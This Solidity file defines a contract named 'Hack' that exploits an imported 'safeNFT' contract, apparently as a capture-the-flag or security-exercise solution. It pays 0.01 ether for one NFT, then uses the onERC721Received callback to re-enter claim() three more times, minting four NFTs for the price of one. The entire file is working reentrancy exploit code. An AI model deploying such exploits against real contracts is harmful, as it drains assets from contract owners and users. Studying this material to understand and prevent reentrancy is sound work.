// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "./safeNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Hack is IERC721Receiver {
    uint256 public count;
    safeNFT public safeNFTContract;

    constructor(address _safeNFTContractAddress) {
        safeNFTContract = safeNFT(_safeNFTContractAddress);
    }

    function claimNFT() external payable {
        require(msg.value == 0.01 ether, "Incorrect amount of ether");
        safeNFTContract.buyNFT{value: msg.value}();
    }

    function attack() external payable {
        safeNFTContract.claim();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        //It will call the claim function three times so in total 4 NFTs will be minted on the price of 1
        while (count < 3) {
            count = count + 1;
            safeNFTContract.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
